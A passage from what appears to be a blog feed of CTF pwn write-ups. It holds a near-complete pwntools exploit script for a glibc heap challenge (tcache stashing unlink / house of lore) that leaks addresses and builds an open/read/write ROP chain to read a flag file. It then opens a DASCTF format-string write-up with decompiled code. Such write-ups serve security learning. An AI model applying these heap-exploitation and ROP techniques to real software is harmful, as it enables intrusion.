operator\">=</span>default     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>rpu     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims<span class=\"token punctuation\">,</span> time<span class=\"token operator\">=</span>default     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">,</span>drop<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>lic     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> length                   <span class=\"token punctuation\">:</span> <span class=\"token string\">b'Yhuan'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">//</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'Y'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>lg      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> var_name                 <span class=\"token punctuation\">:</span> log<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>var_name<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> ：0x</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token builtin\">globals</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span>var_name<span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span><span class=\"token format-spec\">x</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>prl     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> var_name                 <span class=\"token punctuation\">:</span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>var_name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>debug   <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> command<span class=\"token operator\">=</span><span class=\"token string\">''</span>               <span class=\"token punctuation\">:</span> gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">,</span>command<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>it      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                          <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">meau</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">b'Your input: '</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre></pre></td></tr><tr><td data-num=\"50\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">Add</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">,</span>cz<span class=\"token punctuation\">,</span>ct<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>\tmeau<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">b'Please input the red packet idx: '</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">b'How much do you want?(1.0x10 2.0xf0 3.0x300 4.0x400): '</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>cz<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>\tsa<span class=\"token punctuation\">(</span><span class=\"token string\">b'Please input content: '</span><span class=\"token punctuation\">,</span>ct<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre></pre></td></tr><tr><td data-num=\"56\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">Del</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>\tmeau<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">b'Please input the red packet idx: '</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre></pre></td></tr><tr><td data-num=\"60\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">Edi</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">,</span>ct<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>\tmeau<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">b'Please input the red packet idx: '</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>\tsa<span class=\"token punctuation\">(</span><span class=\"token string\">b'Please input content: '</span><span class=\"token punctuation\">,</span>ct<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre></pre></td></tr><tr><td data-num=\"65\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">Sho</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>\tmeau<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">b'Please input the red packet idx: '</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre></pre></td></tr><tr><td data-num=\"69\"></td><td><pre></pre></td></tr><tr><td data-num=\"70\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">9</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>\tAdd<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'aaaa'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre></pre></td></tr><tr><td data-num=\"73\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>\tDel<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>Sho<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>heapaddr <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0xd6c0</span> <span class=\"token operator\">+</span> <span class=\"token number\">0xb000</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>Sho<span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>libcaddr <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">96</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x10</span> <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">'heapaddr'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">'libcaddr'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre><span class=\"token comment\"># debug()</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre><span class=\"token comment\"># pause()</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>Del<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre></pre></td></tr><tr><td data-num=\"86\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>\tAdd<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'oooo'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>\tDel<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">15</span><span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'aaaa'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'bbbb'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># 防止合併</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>Del<span class=\"token punctuation\">(</span><span class=\"token number\">15</span><span class=\"token punctuation\">)</span>\t\t\t <span class=\"token comment\"># 置入 unsortedbin</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'cccc'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># 切割 </span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'aaaa'</span><span class=\"token punctuation\">)</span><span class=\"token comment\"># 置入 0x100 的 small bin</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">9</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'bbbb'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>Del<span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'cccc'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">11</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'cccc'</span><span class=\"token punctuation\">)</span><span class=\"token comment\"># 置入 0x100 的 small bin</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>debug<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>pl <span class=\"token operator\">=</span> padding<span class=\"token punctuation\">(</span><span class=\"token number\">0x300</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x101</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>heapaddr <span class=\"token operator\">-</span> <span class=\"token number\">0xb000</span> <span class=\"token operator\">+</span> <span class=\"token number\">0xe7e0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>heapaddr <span class=\"token operator\">+</span> <span class=\"token number\">0x250</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x800</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>Edi<span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">,</span>pl<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">14</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'oooo'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>lvr <span class=\"token operator\">=</span> libcaddr <span class=\"token operator\">+</span> <span class=\"token number\">0x0000000000058373</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>rdi <span class=\"token operator\">=</span> libcaddr <span class=\"token operator\">+</span> <span class=\"token number\">0x0000000000026542</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre>rsi <span class=\"token operator\">=</span> libcaddr <span class=\"token operator\">+</span> <span class=\"token number\">0x0000000000026f9e</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>rdx <span class=\"token operator\">=</span> libcaddr <span class=\"token operator\">+</span> <span class=\"token number\">0x000000000012bda6</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>open_addr <span class=\"token operator\">=</span> libcaddr <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'open'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>read_addr <span class=\"token operator\">=</span> libcaddr <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'read'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>writ_addr <span class=\"token operator\">=</span> libcaddr <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'write'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>flag_addr <span class=\"token operator\">=</span> heapaddr <span class=\"token operator\">-</span> <span class=\"token number\">0xb000</span> <span class=\"token operator\">+</span> <span class=\"token number\">0xf630</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>pay <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token string\">b'./flag\\x00\\x00'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>    rdi<span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>flag_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> rsi<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> open_addr<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>    rdi<span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> rsi<span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>flag_addr<span class=\"token operator\">+</span><span class=\"token number\">200</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> rdx<span class=\"token punctuation\">,</span> <span class=\"token number\">0x40</span><span class=\"token punctuation\">,</span> read_addr<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre>    rdi<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> rsi<span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>flag_addr<span class=\"token operator\">+</span><span class=\"token number\">200</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> rdx<span class=\"token punctuation\">,</span> <span class=\"token number\">0x40</span><span class=\"token punctuation\">,</span> writ_addr</pre></td></tr><tr><td data-num=\"119\"></td><td><pre><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"120\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span>pay<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"121\"></td><td><pre></pre></td></tr><tr><td data-num=\"122\"></td><td><pre>pay2 <span class=\"token operator\">=</span> padding<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>flag_addr<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>lvr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"123\"></td><td><pre>meau<span class=\"token punctuation\">(</span><span class=\"token number\">666</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"124\"></td><td><pre>sa<span class=\"token punctuation\">(</span><span class=\"token string\">b'What do you want to say?'</span><span class=\"token punctuation\">,</span>pay2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"125\"></td><td><pre></pre></td></tr><tr><td data-num=\"126\"></td><td><pre>it<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><blockquote>\n<p>参考</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucm9kZXJpY2tjaGFuLmNuL3poLWNuLzIwMjMtMDItMjctaG91c2Utb2YtYWxsLWFib3V0LWdsaWJjLWhlYXAtZXhwbG9pdGF0aW9uLyMyNC1ob3VzZS1vZi1sb3Jl\">https://www.roderickchan.cn/zh-cn/2023-02-27-house-of-all-about-glibc-heap-exploitation/#24-house-of-lore</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jaXBoZXJzYXcubWUvY3RmLXdpa2kvcHduL2xpbnV4L2hlYXAvaG91c2Vfb2ZfbG9yZS8=\">https://ciphersaw.me/ctf-wiki/pwn/linux/heap/house_of_lore/</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vbHVvbGVxaS9wLzEyODQwMTU0Lmh0bWwjaG91c2Utb2YtbG9yZQ==\">https://www.cnblogs.com/luoleqi/p/12840154.html#house-of-lore</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9rYWJlb3IuY24vSG91c2UlMjBvZiUyMCVFNyVCMyVCQiVFNSU4OCU5NyVFNSVBMCU4NiVFNiVCQyU4RiVFNiVCNCU5RSVFOCVBRiVBNiVFOCVBNyVBMyglRTQlQjglODApLyNIb3VzZS1vZi1sb3Jl\">https://kabeor.cn/House of 系列堆漏洞详解 (一)/#House-of-lore</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly90dHRhbmcuY29tL2FyY2hpdmUvMTM2Mi8jdG9jXzB4MDA=\">https://tttang.com/archive/1362/#toc_0x00</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Ric3FpZ29uZ3ppL2FydGljbGUvZGV0YWlscy8xMjYyOTM5MzI=\">https://blog.csdn.net/tbsqigongzi/article/details/126293932</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9uaWNob2xhcy13ZWkuZ2l0aHViLmlvLzIwMjIvMDIvMDcvdGNhY2hlLXN0YXNoaW5nLXVubGluay1hdHRhY2sv\">https://nicholas-wei.github.io/2022/02/07/tcache-stashing-unlink-attack/</span></p>\n<p><a href=\"https://yhuanhuan01.github.io/2024/07/22/tcache-stashing-unlink-attack(house-of-lore)/\">https://yhuanhuan01.github.io/2024/07/22/tcache-stashing-unlink-attack(house-of-lore)/</a></p>\n</blockquote>\n",
            "tags": [
                "house系列",
                "house-of-lore",
                "tcache-stashing-unlink-attack"
            ]
        },
        {
            "id": "https://yhuanhuan01.github.io/2024/07/22/0720-DASCTF-pwn/",
            "url": "https://yhuanhuan01.github.io/2024/07/22/0720-DASCTF-pwn/",
            "title": "0720_DASCTF_pwn",
            "date_published": "2024-07-21T23:52:04.000Z",
            "content_html": "<h1 id=\"0720_dasctf_pwn\"><a class=\"markdownIt-Anchor\" href=\"#0720_dasctf_pwn\">#</a> 0720_DASCTF_pwn</h1>\n<h3 id=\"springboard\"><a class=\"markdownIt-Anchor\" href=\"#springboard\">#</a> springboard</h3>\n<blockquote>\n<p>考察非栈上格式化字符串</p>\n</blockquote>\n<pre><code>Arch: amd64-64-little\nRELRO: Partial RELRO\nStack: No canary found\nNX: NX enabled\nPIE: No PIE (0x3fe000)\n该程序是动态连接的\n该程序有符号表可用\n</code></pre>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> __cdecl <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>argv<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>envp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+Ch] [rbp-4h]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token function\">myinit</span><span class=\"token punctuation\">(</span>argc<span class=\"token punctuation\">,</span> argv<span class=\"token punctuation\">,</span> envp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Life is not boring, dreams are not out of reach.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Sometimes you just need a springboard.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Then you can see a wider world.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"There may be setbacks along the way.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"But keep your love of life alive.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"I believe that you will succeed.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Good luck.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token function\">putchar</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Here's a simple pwn question, challenge yourself.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"You have an 5 chances to get a flag\"</span><span class=\"token punctuation\">)</span><span class=\"token 